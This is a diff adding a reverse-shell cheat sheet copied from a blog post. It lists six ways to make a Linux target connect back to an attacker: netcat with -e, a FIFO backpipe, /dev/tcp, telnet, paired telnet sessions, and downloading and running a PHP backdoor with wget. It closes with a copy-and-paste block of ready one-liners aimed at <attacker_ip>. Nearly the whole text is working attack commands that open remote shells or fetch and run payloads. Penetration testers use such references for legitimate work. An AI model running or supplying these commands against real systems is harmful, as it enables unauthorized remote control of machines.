@@ -1,0 +1,77 @@
+// originally from http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
+
+6 Linux Shells Using Built-in Tools
+
+#1. netcat
+
+Surprise!!! Nothing new here. Plain and simple. Fire up a listener on the attacker machine on a port which is reachable from the target and connect back to the listener with netcat.
+
+[target]
+root@target:nc 192.168.1.133 8080 -e /bin/bash
+
+[attacker]
+root@attacker:nc -n -vv -l -p 8080
+
+#2. netcat with GAPING_SECURITY_HOLE disabled:
+
+When the GAPING_SECURITY_HOLE is disabled, which means you don't have access to the '-e' option of netcat, most people pass on using netcat and move to something else. Well this just isn't necessary. Create a FIFO file system object and use it as a backpipe to relay standard output from commands piped from netcat to /bin/bash back into netcat. Sounds confusing right?
+
+[target]
+root@target:mknod backpipe p && nc 192.168.1.133 8080 0<backpipe | /bin/bash 1>backpipe
+
+[attacker]
+root@attacker:nc -n -vv -l -p 8080
+
+#3. netcat without netcat:
+
+It takes the /dev/tcp socket programming feature and uses it to redirect /bin/bash to a remote system. It's not always available, but can be quite handy when it is.
+
+[target]
+root@target:/bin/bash -i > /dev/tcp/192.168.1.133/8080 0<&1 2>&1
+
+[attacker]
+root@attacker:nc -n -vv -l -p 8080
+
+#4. netcat without netcat or /dev/tcp:
+
+/dev/tcp not available either? Just use telnet with technique #2.
+
+[target]
+root@target:mknod backpipe p && telnet 192.168.1.133 8080 0<backpipe | /bin/bash 1>backpipe
+
+[attacker]
+root@attacker:nc -n -vv- -l -p 8080
+
+#5. telnet-to-telnet:
+
+I'm not sure why you'd use this technique, but it's an option, so here it is nonetheless. This is clearly the ugliest of the techniques. This technique uses two telnet sessions connected to remote listeners to pipe input from one telnet session to /bin/bash, and pipe the output to the second telnet session. Commands are entered into one the of the attackers listeners and feedback is received on the other. Not so bad if you have a terminal multiplexer like tmux running though.
+
+[target]
+root@target:telnet 127.0.0.1 8080 | /bin/bash | telnet 127.0.0.1 8888
+
+[attacker1]
+root@target:nc -n -vv -l -p 8080
+[attacker2]
+root@target:nc -n -vv -l -p 8888
+
+#6. PHP reverse shell via interactive console:
+
+The last technique makes use of the php interactive console. The attacker issues one command which moves to the /tmp directory (because it is typically world writable), uses wget to download a malicious php reverse_tcp backdoor (which the attacker hosts on a web server that he controls), and executes the backdoor via the interactive console.
+
+[target]
+root@target:cd /tmp && wget -O [localfilename].php [url]/test/[remotefilename].php.txt && php -f [localfilename]
+
+# Copy and paste:
+
+#1
+nc <attacker_ip> <port> -e /bin/bash
+#2
+mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
+#3
+/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
+#4
+mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
+#5
+telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
+#6
+wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
